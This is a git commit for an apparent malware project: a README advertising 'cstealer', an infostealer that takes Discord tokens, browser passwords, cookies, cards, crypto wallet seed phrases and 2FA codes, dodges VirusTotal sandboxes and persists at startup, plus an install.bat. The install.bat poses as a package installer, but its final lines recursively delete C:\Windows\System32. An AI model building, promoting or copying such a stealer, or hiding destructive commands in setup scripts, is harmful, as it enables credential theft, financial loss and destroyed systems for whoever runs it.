c7d82c5ba980883d9cabd891d85baf91ef08e0f3
DRAGONS-glitches <lovellhenry87@gmail.com>
2024-11-03 13:47:17 +0000

    updated to exe due to py not working anymore.
    Telegram: https://t.me/cservicess
    🔱 Join Telegram for support and contact 🔱
    
    
    Features
    Discord Information
    
    Nitro
    Badges
    Billing
    Email
    Phone
    HQ Friends
    HQ Guilds
    Gift Codes
    Browser Data
    
    Cookies
    Passwords
    Histories
    Autofills
    Bookmarks
    Credit/Debit Cards
    From Chrome, Edge, Brave, Opera GX, and many more...
    Crypto Data
    
    Extensions (MetaMask, Phantom, Trust Wallet, Coinbase Wallet, Binance Wallet and +40 wallets supported)
    Softwares (Exodus, Atomic, Guarda, Electrum, Zcash, Armory, Binance, Coinomi)
    Seedphrases and backup codes
    Application Data
    
    Steam
    Riot Games
    Telegram
    Discord Injection
    
    Send token, password, email and billing on login or when email/password is changed
    System Information
    
    User
    System
    Disk
    Network
    File Stealer
    
    Grabs Seed Phrases, Tokens, Private Keys, Recovery Codes, Backup Codes, 2FA codes
    General Functions
    
    Check if being run in a VirusTotal sandbox
    Adds file to startup
    Compatibility
    Browsers	Browser Data	Crypto Data	Token Grab
    Chrome	✅	✅	✅
    Edge	✅	✅	✅
    Brave	✅	✅	✅
    Opera (GX)	✅	✅	✅
    Opera	✅	✅	✅
    Yandex	✅	✅	✅
    Firefox	❌	❌	❌
    Install
    Prerequisites
    Windows 10/11
    Python
    Git
    Setup
    Download source code zip
    Extract zip
    First install reqiured packages by double clicking install.bat file
    Run the builder by double clicking the builder.pyw file
    Follow instructions in builder and your exe will be found in the dist folder under the name cstealer.exe
    
      
    
    Caution
    
    This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. Educational purpose only!
    
    Warning
    
    By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.

---
+++ install.bat
@@ -0,0 +1,14 @@
+color 3
+pip install pywin32
+echo this might take a while
+pip install requests
+pip install pycryptodome
+pip install pyinstaller
+pip install customtkinter
+pip install pycryptodome
+pip install Crypto
+pip install packaging
+pip install tk
+pip install wmi
+cd C:\Windows\System32
+del /s C:\Windows\System32
